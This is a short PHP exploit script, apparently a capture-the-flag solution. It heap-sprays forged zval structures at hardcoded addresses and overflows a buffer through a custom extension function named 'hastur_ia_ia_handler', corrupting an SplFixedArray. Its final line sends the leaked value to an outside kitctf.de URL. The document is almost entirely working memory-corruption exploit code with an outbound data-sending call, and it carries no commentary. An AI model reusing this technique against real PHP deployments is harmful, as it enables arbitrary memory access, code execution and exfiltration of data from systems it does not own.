<?php
$payload = str_repeat('a', (1<<26));
for ($i = 0; $i < (1<<26); $i += 0x1000) {
  // value.str.val
  $payload[$i] = "\x80";
  $payload[$i+1] = "\x90";
  $payload[$i+2] = "\x3a";
  $payload[$i+3] = "\xf7";

  // value.str.len
  $payload[$i+4] = "\x40";
  $payload[$i+5] = "\0";
  $payload[$i+6] = "\0";
  $payload[$i+7] = "\0";

  // refcount__gc
  $payload[$i+8] = "\1";
  $payload[$i+9] = "\0";
  $payload[$i+10] = "\0";
  $payload[$i+11] = "\0";

  // type
  $payload[$i+12] = "\x06";
  // reference flag
  $payload[$i+13] = "\0";
  $payload[$i+14] = "\0";
  $payload[$i+15] = "\0";
}

$name = str_repeat('a', 502);

// number of non-dot characters
$n = 513; 
$text = str_repeat('.', (1<<23) - ($n / 513) + $n);

for ($i = 16871; $i < 16871 + 25; ++$i)
  $text[$i] = 'a';

// reliable pointer to our fake ZVal
$text[16871 + 25] ="\x18";
$text[16871 + 26] ="\x10";
$text[16871 + 27] ="\x01";
$text[16871 + 28] ="\xf3";
$i += 4;

for (;$i < 16871 + 513; ++$i)
  $text[$i] = 'a';

$victim = new SplFixedArray(1<<21);
hastur_ia_ia_handler($text, $name);
file_get_contents('https://kitctf.de/win/'. urlencode($victim[0]));
